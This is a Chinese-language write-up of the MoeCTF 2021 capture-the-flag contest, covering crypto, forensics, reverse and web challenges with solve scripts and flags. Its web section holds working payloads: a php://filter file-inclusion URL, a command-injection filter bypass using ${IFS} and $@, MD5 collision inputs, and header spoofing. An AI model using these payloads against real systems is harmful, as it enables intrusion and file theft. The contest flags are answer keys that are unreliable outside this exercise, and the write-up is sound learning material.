# MoeCTF 2021 WriteUp

~~没想到摸鱼摸到第9了（感谢Hidden了的师傅们（逃~~

挺菜的边做边学。

这次主要做了做 `Misc` 和 `Web` ，其他的就看了看前面几个开了开视野（

**题目全部在 `Windows 7` 环境下做出**

已经同步在俺的博客力

[MoeCTF 2021 WriteUp - 康师傅 (ksfu.top)](https://blog.ksfu.top/MoeCTF-2021-WriteUp/)


## 目录

### Crypto（4/14）

1. Cryptography入门指北（略）
2. beginOfCrypto
3. BabyMultiple
4. LazyRSA

### Reverse（2/14）

1. 逆向工程入门指北（略）
2. welcome_to_the_world_of_re

### Classical Cryptography（1/6）

1. Augustine's Way

### Bonus(0/1)

### MISC(12/12）~之前是13个来着~

1. Misc入门指北（略）
2. find_me
3. Macross
4. Homework
5. flipflipflip
6. White Album
7. Phone Call
8. 社工题
9. 好 康 的
10. easyForensics
11. R P G
12. 诺亚的日记

### Pwn（3/11）

1. Pwn入门指北（略）
2. test_your_nc
3. Int_overflow

### Web（9/14）

1. Web入门指北（略）
2. Web安全入门指北—GET
3. Web安全入门指北—小饼干
4. 2048
5. Web_Inc
6. ezinclude
7. babeRCE
8. Do you know HTTP?

### 问卷题(1/2)

1. 信息统计（略）



## Crypto

> Python 真是绝绝子！

### 02 beginOfCrypto

打开下载的文件发现下面有申必的数字，然后再看上面有 `flag = xxx`  , 再看一眼代码，应该是把字符通过申必的方法转换成申必的数字，然后先赋值 `flag = "moectf"` 发现和前面几个数字对上了，然后用只能人工方法将26个字母和几个符号带进去都看了一遍值，找到了flag

<details>
<summary>Flag</summary>
<p><b>moectf{c0me_on!begin_your_Crypt0_c4r33r}</b></p>
</details>

### 03 BabyMultiple

和上一题一样，带进去不同字符经过处理变成其他申必字符，然后利用智能人工全部带了一遍，得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{y0u_4r3_gr34t_47_Mu17ic4ti0n}</b></p>
</details>
### 04 LazyRSA

去网上大概查了一下原理，然后对着教程里的代码改了一下

读的博客

>https://www.cnblogs.com/hiwuchong/p/9069392.html
>
>https://blog.csdn.net/carroll_/article/details/79975226
>
>https://blog.csdn.net/Ahuuua/article/details/108830834
>
>https://blog.csdn.net/weixin_41818069/article/details/106532665
>
>https://www.cnblogs.com/Higgerw/p/14289041.html
>
>http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html
>
>https://blog.csdn.net/qq_41429081/article/details/103403957
>
>https://blog.csdn.net/tinyzhao/article/details/52681634

```python
from Crypto.Util.number import*
import gmpy2
import binascii

p = (题目里的p)
q = (题目里的q)
c = (题目里的c) 

n = p*q
e = 0x10001

d = gmpy2.invert(e, (p-1)*(q-1))
m = pow(c,d,n)
# c = pow(m,e,n)
print(hex(m))
print(binascii.unhexlify(hex(m)[2:].strip("L")))
```

<details>
<summary>Flag</summary>
<p><b>moectf{w0w_yOU_Know_h0w_70_d3crypt_th3_RSA}</b></p>
</details>


## Reverse

### 02 welcome_to_the_world_of_re

~~之前找简单软件注册码的法子~~

直接拖进 `OD` 能找到，拖进文本也行（

<img src="https://i.loli.net/2021/09/21/RwJMH68qB2hKjIE.png" alt="re1.PNG" style="zoom:80%;" />

<img src="https://i.loli.net/2021/09/21/ZL6sevtD1lGIrzk.png" alt="re2" style="zoom:80%;" />

<details>
<summary>Flag</summary>
<p><b>moectf{W31C0Me_t0_m03CTF_2021_w0o0o0oooo0ooooo0o0oooo0!!!}</b></p>
</details>


## Classical Cryptography

~~看的时候离结束还有半天了，就看了第一个~~

### 01 Classical Cryptography

前几个和 `moectf` 对比了一下发现是每个字母后移了一位

<details>
<summary>Flag</summary>
<p><b>moectf{e3sy_Au9u1ne!}</b></p>
</details>


## Misc

### 02 find_me

拖进 `010 Editor`

<details>
<summary>Flag</summary>
<p><b>moectf{hs_g1v3_u_fl@g}</b></p>
</details>

### 03 Macross

百度搜了半天不晓得这是啥，然后上 Google 搜出来是个记录鼠标移动的软件~~（Google真是绝绝子）~~，下载安装，然后打开 Windows 图画，运行文件，得到名画

<img src="https://i.loli.net/2021/09/21/BNxQez71C68ObY9.png" alt="Mar" style="zoom:80%;" />

<details>
<summary>Flag</summary>
<p><b>moectf{Rec0rder_15_Funny}</b></p>
</details>

### 04 Homework

先看了一遍啥也没找到，然后先全选清除格式发现半个flag，然后用 `7-zip` 解压出来直接看 `xml` 里东西了，搜 `}`，找到后一半，当然在 Word 里搜 `{` 发现是个文本框，拿到后半段flag

<details>
<summary>Flag</summary>
<p><b>moectf{0h_U_f1nd_m3!}</b></p>
</details>
### flipflipflip

这个题可太折磨人了……

参考博客

>https://www.cnblogs.com/1go0/p/9977359.html
>
>https://www.cnblogs.com/mq0036/p/6544055.html
>
>https://blog.csdn.net/csqazwsxedc/article/details/59186769?fps=1&locationNum=2
>
>https://www.it1352.com/904413.html
>
>https://www.cnpython.com/qa/153478
>
>https://www.cnblogs.com/h-zhang/p/10568028.html
>
>https://www.cnblogs.com/zuferj115/p/11547486.html
>
>https://blog.csdn.net/u010065754/article/details/81710160
>
>https://www.cnblogs.com/erchun/p/11766408.html
>
>https://blog.csdn.net/Blood_Seeker/article/details/81519426?utm_source=blogxgwz3
>
>https://blog.csdn.net/weixin_43742794/article/details/104210963
>
>https://www.cnblogs.com/qsmyjz/p/11987815.html

我超，100多MB的字符串，刚开始没头绪最后xjb猜是base64，那么大文件得整个脚本，然后网上搜

```python
import base64
import sys
text = open('C:\\Users(后面文件路径省略了)').read()
if(len(text)%3 == 1): 
    text += "=="
elif(len(text)%3 == 2): 
    text += "=" 
with open('C:\\Users\\Users(后面文件路径省略了)', 'wb') as file_object:
    file_object.write(base64.b64decode(text))
print("success")
```

第一遍看着解出来好东西了，然后第二遍解出来不知道一堆啥东西……然后又不会整了。

突然发现第一遍解出来的东西开头是 `==` ，再想想题目名字……base64倒过来了属于是，然后整了个反转的脚本

```python
import base64
import sys
text = open('C:\\Users\\(后面路径省略)').read()
with open('C:\\Users\\(后面路径省略)', 'w') as file_object:
    file_object.write(text[::-1])
print("success")
```

然后就这么xjb整……遇见解出来不对劲的就反转……然后通过智能人工整了70多次。。。从100多MB整到1KB……得到flag

<img src="https://i.loli.net/2021/09/21/3NzvcCOM6ZYuqRW.png" alt="filp" style="zoom:80%;" />

<details>
<summary>Flag</summary>
<p><b>moectf{fffffflipppppp}</b></p>
</details>

### White Album

看到 `.png` ，就猜要么是LSB要么是图片尺寸问题，试了一下果然是图片尺寸，在`010 Editor` 里改了下尺寸得到一个申必图案

<img src="https://i.loli.net/2021/09/21/ZpC9ox3itfAJLQm.jpg" alt="whilt" style="zoom:80%;" />

猜了下是条码，就搜了下条码图案，发现是 `pdf417` ，想找个在线扫的发现很难找，最后找到个网站可以解这个

>https://online-barcode-reader.inliteresearch.com/

得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{WhY_@r3_u_s0_5K1ll3D}</b></p>
</details>

### Phone Call

参考博客

> http://dyf.ink/crypto/classical/others/#_24
>
> https://blog.csdn.net/cg1510167/article/details/114279633
>
> https://blog.csdn.net/weixin_33806914/article/details/91868832

就拖进AE看就行，手动一个一个解的，得到~~很臭的~~flag

<details>
<summary>Flag</summary>
<p><b>moectf{114514-1919810-7738-9634}</b></p>
</details>
### 社工题

这题可太草了，从假期整到开学……原来有4个博客2个仓库……

> [NoahBox (noahtie.github.io)](https://noahtie.github.io/)
>
> https://noahbox.github.io/
>
> https://nuoyazhicheng.lofter.com/
>
> https://masternoah.lofter.com/

在hexo博客点签订契约进入lofter博客，在lofter博客点一下上面 **i** 一样的标志找到另一个hexo博客，在里面留言板里找到了 HackerHS，最后找到第二个仓库根据意思在里面找到commits，发现莫斯电码，复制到在线网站解密，得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{HAHAHAHAH_NOAH_IS_A_VEGETABLE_CHICKEN}</b></p>
</details>

### 好 康 的

<img src="https://i.loli.net/2021/09/21/qO3mhC6S4aAVXFL.png" alt="rr1" style="zoom:80%;" />

（被骗一次，之后就会被骗第二次

太草了，放完发现后面有一段不能放，用 `mkvtoolnix` 分离出来字幕，拖进`010 Editor` 直接搜索 `moectf` ，找到flag

<details>
<summary>Flag</summary>
<p><b>moectf{N3v3r_90tt@_L3t-y0U_dOwN~}</b></p>
</details>

### easyForensics

参考博客

> https://blog.csdn.net/luostudent/article/details/113786916?utm_term=base64%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%96%87%E4%BB%B6python&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-113786916&spm=3001.4430
>
> https://blog.csdn.net/qq_37865996/article/details/87970732
>
> http://blog.sina.com.cn/s/blog_68f8a3370102vqv7.html

找了半天，用 `AccessData FTK Imager` 打开，挂载，进入，翻目录找到 `flag.mp4` 一气呵成

打开 `flag.mp4` 

<img src="https://i.loli.net/2021/09/21/qO3mhC6S4aAVXFL.png" alt="rr1" style="zoom:80%;" />

草

又经过了漫长的鼓捣，最后在 `FTK` 里发现一些被删除的文件夹还有一个python文件，都是申必的命名，全部导出来，读了代码发现是把一个文件转成base64了，这里要注意 `data = data.replace("/", "_")`

写了个脚本把文件夹的名字提取了出来（发现写了两个，好像差不多，随便粘一个）

```python
# -*- coding: utf-8 -*-
import os
import base64
import sys
file_dir = 'C:\\Users\\(之后目录省略)'
s = ''
for root, dirs, files in os.walk(file_dir):
    var = root
    s = s + var[54:]
s = s.replace("_", "/")
with open('C:\\Users\\(之后目录省略)', 'w') as file_object:
    file_object.write(s)
print("success")
```

然后用脚本把base64转文件，还搜了个大佬写的图形化工具，（最后发现是个word）得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{Th@_1s_N0t_U53FULL_@_4LL}</b></p>
</details>

### R P G

是游戏捏，按F12还能出来 DevTools 捏，本来想怎么改地图直接穿过去，发现不会整，然后又改了下等级，好像也没啥用，然后又整了一下一进去就是第二个，还是不会整，最后在`Map002.json` 里发现了好像base64的申必字符，然后复制出来，得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{Th3_w0rld_0f_G4m3}</b></p>
</details>
### 诺亚的日记

~~我超，嘉心糖~~

参考博客

> https://blog.csdn.net/qiuchi1975/article/details/106149854/
>
> https://blog.csdn.net/u012388993/article/details/116395497
>
> https://www.codercto.com/a/109222.html
>
> https://www.anquanke.com/post/id/85218
>
> https://www.jianshu.com/p/ba9763ceb620
>
> https://www.jianshu.com/p/756aa623c3b5
>
> https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html
>
> https://www.jianshu.com/p/756aa623c3b5
>
> https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html

是个流量包捏，随便翻了一下里面 `HID Data` 里好像有好东西捏，但怎么提取出来捏？看了上面的博客，先把流量包用 `tshark` 转换成json，找到 `HID Data` 叫啥，然后再提出来

```shell
tshark.exe -T json -r pcapng.pcap > test.json
```

```shell
tshark.exe -r pcapng.pcap -T fields -e usbhid.data > usbdata.txt
```

然后看博客里面只有两位是有用的，然后就是对着表翻译。找了好多脚本都是错的，交了很多次……最后终于找到个有用的

```python
# coding:utf-8
import sys
import os

usb_codes = {
    0x04: "aA", 0x05: "bB", 0x06: "cC", 0x07: "dD", 0x08: "eE", 0x09: "fF",
    0x0A: "gG", 0x0B: "hH", 0x0C: "iI", 0x0D: "jJ", 0x0E: "kK", 0x0F: "lL",
    0x10: "mM", 0x11: "nN", 0x12: "oO", 0x13: "pP", 0x14: "qQ", 0x15: "rR",
    0x16: "sS", 0x17: "tT", 0x18: "uU", 0x19: "vV", 0x1A: "wW", 0x1B: "xX",
    0x1C: "yY", 0x1D: "zZ", 0x1E: "1!", 0x1F: "2@", 0x20: "3#", 0x21: "4$",
    0x22: "5%", 0x23: "6^", 0x24: "7&", 0x25: "8*", 0x26: "9(", 0x27: "0)",
    0x2C: "  ", 0x2D: "-_", 0x2E: "=+", 0x2F: "[{", 0x30: "]}", 0x32: "#~",
    0x33: ";:", 0x34: "'\"", 0x36: ",<", 0x37: ".>", 0x4f: ">", 0x50: "<"
}


def code2chr(filepath):
    lines = []
    pos = 0
    for x in open(filepath, "r").readlines():
        code = int(x[4:6], 16)  # 即第三个字节
        if code == 0:
            continue
        # newline or down arrow - move down
        if code == 0x51 or code == 0x28:
            pos += 1
            continue
        # up arrow - move up
        if code == 0x52:
            pos -= 1
            continue

        # select the character based on the Shift key
        while len(lines) <= pos:
            lines.append("")
        if code in range(4, 81):
            if int(x[0:2], 16) == 2:
                if code in usb_codes:
                    lines[pos] += usb_codes[code][1]
                else:
                    lines[pos] += "<un>"
            else:
                if code in usb_codes:
                    lines[pos] += usb_codes[code][0]
                else:
                    lines[pos] += "<un>"
    result = ""
    for x in lines:
        result += x
        # print(x)
    fout = open('C:\\Users\\(后面路径省略)', 'w')
    fout.write(result)
    fout.close()


if __name__ == "__main__":
    code2chr('C:\\Users\\(后面路径省略)')
```

得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{D@m3daNe_D4me_yoooooo}</b></p>
</details>


## PWN

### 02 test_your_nc

如题

```shell
nc pwn.blackbird.wang 9500
ls
cat flag
```

得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{enjoy_the_netcat_and_the_shell}</b></p>
</details>

### 03 Int_overflow

试着试着给了个 `-1` ，得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{y0ul0v3m3m3l0v3y0u_1nt0v3rfl0w}</b></p>
</details>



## Web

~~PHP真实绝绝子~~

### 02 Web安全入门指北—GET

```
http://47.93.215.154:10000/?moe=flag
```

<details>
<summary>Flag</summary>
<p><b>moectf{We1c0me_t0_CTF_Web!}</b></p>
</details>

### 03 Web安全入门指北—POST

随便找个在线工具发POST就行

<details>
<summary>Flag</summary>
<p><b>moectf{POST_1s_an_1mp0rtant_m3th0d!}</b></p>
</details>

### 03 Web安全入门指北—小饼干

浏览器F12 把cookies里值改成1，刷新

<details>
<summary>Flag</summary>
<p><b>moectf{C00kie_1s_sw33t!}</b></p>
</details>
### 04 2048

审查元素大法好，找到代码

```javascript
getFlag: function() {
        var req = new XMLHttpRequest;
        req.open("GET","flag.php?score="+obj.score,true);
        req.onload = function() {
            alert(this.responseText);
            }
        req.send();
      }
```

打开发现申必数字`50000`

```
http://47.93.215.154:5001/flag.php?score=50000
```

获得flag

<details>
<summary>Flag</summary>
<p><b>moectf{2048_1s_intere5t1ng!}</b></p>
</details>

参考博客

> [(6条消息) 总结ctf中 MD5 绕过的一些思路_y0un9er-CSDN博客_ctf md5绕过](https://blog.csdn.net/CSDNiamcoming/article/details/108837347)

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

<details>
<summary>Flag</summary>
<p><b>moectf{xdsec3gf9dfg62fh342}</b></p>
</details>

### ezinclude

参考博客

> https://blog.csdn.net/vhkjhwbs/article/details/99728785
>
> https://blog.csdn.net/qq_42181428/article/details/87090539
>
> https://www.leavesongs.com/PENETRATION/php-filter-magic.html
>
> https://www.cnblogs.com/ichunqiu/p/10683379.html

``` 
http://47.98.215.112:5000/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

得到base64字符串，解码

<details>
<summary>Flag</summary>
<p><b>moectf{xdsec6asdgas7ahfsfaxczc}</b></p>
</details>

### babeRCE

参考博客

> https://blog.csdn.net/qq_44657899/article/details/107676580

挺有意思，试了里面好多法子，最后试出来了然后还得每个字符之间都加

```
http://47.93.215.154:5000/?rce=t$@a$@c${IFS}f$@l$@a$@g$@.$@p$@h$@p
```

<details>
<summary>Flag</summary>
<p><b>oectf{Do_y0u_l1k3_Rcccccccccccccce?}</b></p>
</details>

### Do you know HTTP?

php真是绝绝子

用php+curl，查阅了文档，然后一步一步按题给的要求加东西

```php+HTML
<?php

$url='http://47.93.215.154:5002';
$ch=curl_init();
$header = array (
    "Referer: www.ltyyds.com",
    "X-Forwarded-For: 127.0.0.1",
    "User-Agent: LT",
    "Date: Dec, 26 Dec 2015 17:30:00 GMT",
);

curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_CUSTOMREQUEST,'HS');
curl_setopt($ch,CURLOPT_TIMEOUT,5);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
#curl_setopt($ch,CURLOPT_HTTPHEADER,array("X-Forwarded-For: 127.0.0.1"));
curl_setopt($ch,CURLOPT_HTTPHEADER,$header);
$content=curl_exec($ch);
echo $content;

?>
```

得到flag

<details>
<summary>Flag</summary>
<p><b>moectf{HTTPHeaders_1s_s0_ea5y!}</b></p>
</details>
